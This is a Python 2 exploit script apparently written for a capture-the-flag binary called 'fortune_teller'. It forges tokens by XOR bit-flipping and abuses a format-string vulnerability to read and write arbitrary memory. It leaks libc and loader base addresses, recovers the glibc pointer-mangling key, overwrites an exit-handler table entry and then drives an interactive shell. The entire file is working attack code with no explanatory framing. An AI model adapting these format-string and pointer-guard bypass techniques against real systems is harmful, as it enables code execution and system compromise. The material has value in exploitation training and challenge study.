from subprocess import *
import struct
import commands, sys

def sxor(s1,s2):    
    return ''.join((chr(ord(a) ^ ord(b))) for a,b in zip(s1,s2))

class Exploit:
	def __init__(self, debug = False):
		
		if debug:
			self.stdin = open('stdin', 'w', 0)
			self.stdout = open('stdout', 'r', 0)
			#self.stdout = open('stdout', 'rb')
			#raw_input()
		else:
			p = Popen("/home/fortune_teller/fortune_teller", shell=True, stdin=PIPE, stdout=PIPE, close_fds=True)
			self.stdin = p.stdin
			self.stdout = p.stdout
			self.time = "e9c3ae424e609257857E772A95580208848A55F999B0D99B"


	def read_banner(self):
		for i in xrange(20):
			print self.stdout.readline()

	def read_menu(self):
		for i in xrange(5):
			print self.stdout.readline()
		print self.stdout.read(2)

	def get_token(self, s):
		self.read_menu()
		self.stdin.write("1\n")
		self.stdout.read(len("[+] what is your name? : "))
		self.stdin.write(s+"\n")
		self.stdout.read(len("\n[+] your token is : "))
		token = self.stdout.readline()
		self.stdout.read(len("[+] Keep in this info, and see you again 30 minutes later!"))
		return token.rstrip()

	def send_token(self, t):
		self.read_menu()
		self.stdin.write("2\n")
		self.stdout.read(len("[+] show me your token : "))
		self.stdin.write(t +"\n")
		d = self.stdout.readline()
		if d.find('[!] error') >= 0:
			d = self.stdout.readline()
		
		if d.find('[!]') >= 0: # error
			return None
		else:
			for x in xrange(27):
				self.stdout.readline()
			return d[11:]

	def send_format_string(self, t, pad = ""):
		time = "e9c3ae424e609257857E772A95580208848A55F999B0D99B"
		if len(t) > 8:
			print "wrong"
		t = t.zfill(8)
		cipher_text = "E9C3AF424E6092574A3174498FF54B8F"
		iv = cipher_text[0:16].decode("hex")
		enc = cipher_text[16:].decode("hex")
		return self.send_token(sxor(sxor(iv, "a"*8), t).encode("hex") + cipher_text[16:] + time + pad)

	def send_format_string2(self, t, pad = ""):
		t = t + "\&\&20000000"
		out = commands.getstatusoutput('./generator ' + t)[1]
		out += "\x00" * (200 - len(out))
		out += pad
		return self.send_token(out)

	def arbitary_memory_read(self, addr):
		return e.send_format_string2("%273\$s", struct.pack('<I', addr))

	def arbitary_memory_write(self, addr, value):
		prev = 0
		result = ""
		pad = ""
		for x in xrange(4):
			target = value & 0xff
			value >>= 8
			if (prev > target):
				target += 0x100
			result += "%%%dc%%%d\$n" % (target - prev, 273 + x)
			prev = (target & 0xff)
			pad += struct.pack('<I', addr + x)

		return e.send_format_string2(result, pad)

	def send_bye(self):
		e.read_menu()
		self.stdin.write("3\n")

	def send_command(self):
		while(True):
			e.stdin.write(raw_input() + "\n")
			print e.stdout.readline()

ror=lambda x, y: ((x & 0xFFFFFFFF) >> y) | (x << (32-y%32)) & 0xFFFFFFFF
rol=lambda x, y: (x << y) & 0xFFFFFFFF | ((x & 0xFFFFFFFF) >> (32-y%32))


e = Exploit()
e.read_banner()
"""
#token = e.get_token("a"*16)
#print token
print e.send_format_string("%243$9x", "BBBB")
libc_start_main = int(e.send_format_string("%327$9x", "BBBB")[10:18], 16)
image_base =  int(e.send_format_string("%335$9x", "BBBB")[10:18],16)
print image_base
#print e.send_format_string("%243$s", struct.pack('<I', image_base + 0x29B8))
print e.send_format_string("%243$s", struct.pack('<I', image_base + 0x4120))
"""

libc_start_main = int(e.send_format_string2("%327\$x"),16)
libc_base = libc_start_main - 0x000194D3
image_base = int(e.send_format_string2("%335\$x"), 16)
print "image_base : %x" % image_base
rtld_global_ro = struct.unpack('<I', e.arbitary_memory_read(libc_base + 0x001A5EF8)[0:4])[0]
ld_base = rtld_global_ro - 0x0020CA0
dl_fini = ld_base + 0xF280

print "ld_base : %x" % ld_base
print "dl_fini : %x" % dl_fini

table = libc_base + 0x001A721C
encrypted_dl_fini = struct.unpack('<I', e.arbitary_memory_read(table)[0:4])[0]
xor_key = ror(encrypted_dl_fini, 9) ^ dl_fini
print "xor_key : %x" % xor_key

target = libc_base + 0x003F430 
#target = 0x41424344
encrypted_target = rol(target ^ xor_key, 9)

#e.arbitary_memory_write(image_base + 0x4222, 0x41424344)
#e.arbitary_memory_write(table, encrypted_target)
e.arbitary_memory_write(table + 4,libc_base + 0x00161D98)
#e.arbitary_memory_write(libc_base + 0x1A424C, 0x41424344)
e.send_bye()
e.send_command()


"""
for x in xrange(180, 350):
	d = e.send_format_string2('%%%d\$9x' % x, "AAAA")
	#print d
	if d.find('4d3') >= 0:
		print x, d
"""
